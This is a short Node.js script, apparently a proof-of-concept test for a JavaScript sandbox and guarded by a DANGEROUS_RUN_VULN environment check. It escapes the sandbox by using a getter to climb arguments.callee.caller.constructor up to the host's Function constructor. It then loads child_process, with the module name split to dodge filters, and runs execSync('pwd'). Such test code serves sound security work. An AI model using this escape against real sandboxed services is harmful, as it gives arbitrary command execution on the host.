if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const out = (() => {
	const targetKey = Object.keys(this)[0];
	Object.defineProperty(this, targetKey, {
		get: function () {
			return arguments.callee.caller.constructor(
				"return global.process.mainModule.require('child_'+'process').execSync('pwd').toString()",
			)();
		},
	});
})();
console.log(out);

setTimeout(() => {
	process.exit(82);
}, 1000);
